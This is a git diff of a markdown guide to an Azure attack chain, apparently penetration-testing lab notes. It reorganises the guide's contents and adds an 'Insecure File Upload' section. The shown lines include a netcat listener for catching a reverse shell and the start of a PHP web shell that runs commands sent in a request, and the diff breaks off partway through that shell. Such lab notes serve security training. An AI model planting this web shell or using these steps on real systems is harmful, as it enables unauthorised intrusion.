@@ -6,7 +6,9 @@
 - [Enum tools]
 - [Consent Abuse](https://github.com/conma293/Azure/blob/main/killcycle.md#consent-abuse)
 - [App Service](https://github.com/conma293/Azure/blob/main/killcycle.md#app-service)
-- [Server Side Template Injection (SSTI)](https://github.com/conma293/Azure/blob/main/killcycle.md#server-side-template-injection-ssti)
+  - [Insecure File Upload]
+  - [Server Side Template Injection (SSTI)](https://github.com/conma293/Azure/blob/main/killcycle.md#server-side-template-injection-ssti)
+  - OS Command Injection
 
 * * *
 
@@ -362,8 +364,9 @@ Now, start a listener on your student VM to catch the reverse shell:
 C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444 
 listening on [any] 4444 ...
 ```
-### App Service
-now lets upload hilarious shell:-
+### App Services
+#### Insecure File Upload
+We find a vulnerable form to upload files into, now lets upload hilarious shell:-
 ```
 <?php 
 system($_REQUEST['cmd']);
